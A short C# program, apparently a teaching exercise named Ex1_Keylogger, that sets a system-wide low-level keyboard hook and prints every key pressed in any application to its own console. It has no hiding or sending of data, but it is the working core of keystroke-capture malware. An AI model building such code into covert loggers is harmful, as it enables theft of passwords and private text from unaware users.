using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Ex1_Keylogger
{
	internal class Program
	{
		private static IntPtr _hookPtr = IntPtr.Zero;

		private static void Main(string[] args)
		{
			AttachHook();

			// start windows message pump
			Application.Run();

			DetachHook();
		}

		private static void AttachHook()
		{
			// get current process
			using (var currentProcess = Process.GetCurrentProcess())
			{
				// get main module handle of current process
				var moduleHandle = Native.GetModuleHandle(currentProcess.MainModule.ModuleName);

				// set system wide keyboard hook
				_hookPtr = Native.SetWindowsHookEx(HookType.WhKeyboardLl, KeyboardHookCallback, moduleHandle, 0);
			}
		}

		private static void DetachHook()
		{
			// remove hook
			Native.UnhookWindowsHookEx(_hookPtr);
		}

		private static IntPtr KeyboardHookCallback(int code, IntPtr wParam, IntPtr lParam)
		{
			// check if code and event type is correct
			if (code >= 0 && wParam == (IntPtr)WindowsMessage.Keydown)
			{
				// read key code from unmanaged memory
				int keyCode = Marshal.ReadInt32(lParam);

				// write out pressed key
				Console.WriteLine((Keys)keyCode);
			}

			// call next hook
			return Native.CallNextHookEx(_hookPtr, code, wParam, lParam);
		}
	}
}
